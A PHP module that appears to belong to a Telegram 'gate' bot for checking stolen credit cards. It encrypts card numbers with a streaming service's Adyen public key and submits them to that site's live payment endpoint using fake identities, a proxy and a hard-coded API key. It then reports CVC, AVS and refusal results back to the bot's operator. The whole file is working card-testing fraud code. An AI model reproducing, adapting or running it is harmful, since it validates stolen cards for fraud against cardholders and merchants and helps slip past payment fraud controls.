<?php

use App\Faker\{Name, Internet, Address};
use App\Models\Bot;
use App\Gate\{Make, Responses as Res};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];
const API_KEY = '10001|C9552E35949AFB903F2DFC88A87728D6FAABE805D63D354063D39E6A1C21A7A47BBF8806AB544EEDDA8A1B167667892BEE3C7F198A87522A888003EB5D74A2AE7B118EA1209A269234F30B5BC3E6F4E125D92405C3CFD7FB6D4A8AC86435B0B3D7E8FB58FF4234FDB163B3B85609CFB6A1985C2F25859F5564F29894F415375A40B90F6FB78B2E9F003EC506EA7DC3FA6FFD3657B018F53C20C1E53E7EE16F75B402EA3439CB2D894F109112D5DB845877E7730518CB761AAC7E201DE60CC2AE12686D0EC43B3D39E0D1A2413ED6369B5D83F6CBAF1118DA9AAA1EF86DE53DA05724614FC40679C10AD99F62EB0C0D9E589FFF2B72AB9A2B4807F97C99A108AB';

$encrypt_result = shell_exec(ParseAdyenCli(API_KEY, $cc, trim(Name::firstName()) . ' ' . Name::lastName()) . ' node adyen/encrypt/index.js');
$cse = json_decode($encrypt_result, true);
# ~ REQ 1 ~ #
$header1 = ['accept: application/json, text/plain, */*', 'Content-Type: application/json;charset=UTF-8', 'x-api-key: JSOPMsTlAS73D2SmBtcFsrtFVwbhwxX4iEkBNC22', 'Referer: https://signup.pureflix.com/signup/payment'];
$post1 = json_encode(['paymentMethod' => ['type' => 'scheme', 'encryptedCardNumber' => $cse['cc'], 'encryptedExpiryMonth' => $cse['mm'], 'encryptedExpiryYear' => $cse['yy'], 'encryptedSecurityCode' => $cse['cvc'], 'holderName' => Name::firstName() . ' ' . Name::lastName(), 'billingAddress' => ['city' => Address::city(), 'country' => 'US', 'houseNumberOrName' => 'NA', 'postalCode' => Address::zip(), 'stateOrProvince' => Address::state(), 'street' => Address::streetName()]], 'returnUrl' => 'https://signup.pureflix.com/signup/2/n/payment', 'mpxUserId' => 'https://euid.theplatform.com/idm/data/User/NwFqg_Qft4_jzwX1/735712354', 'shopperEmail' => Internet::email()]);
$site1 = ['url' => 'https://wuxfdb4hkd.execute-api.us-west-2.amazonaws.com/throttled/pureflix-AdyenPayments-prod','method' => 'POST', 'post' => $post1, 'headers' => $header1, 'cookie' => null, 'proxy' => $proxy2];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);


$res = json_decode($req1->body, true);
error_log($req1->body.PHP_EOL);

$riskcode = $res['fraudResult']['accountScore'] ?? $res['refusalReasonCode'] ?? null;
$cvv      = $res['additionalData']['cvcResultRaw'] ?? null;
$avs      = $res['additionalData']['avsResultRaw'] ?? null;
$msg      = $res['refusalReason'] ?? $res['message'] ?? 'NA';
$code     = $res['resultCode'] ?? $res['code'] ?? 'NA';

Res::SetParams($msg, $code, $avs, $cvv, $req1->body);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], 'Msg: ' . $msg . ' ['.$riskcode.']');

// $site2 = ['url' => '','method' => 'GET', 'post' => null, 'headers' => [], 'cookie' => null, 'proxy' => $proxy2];
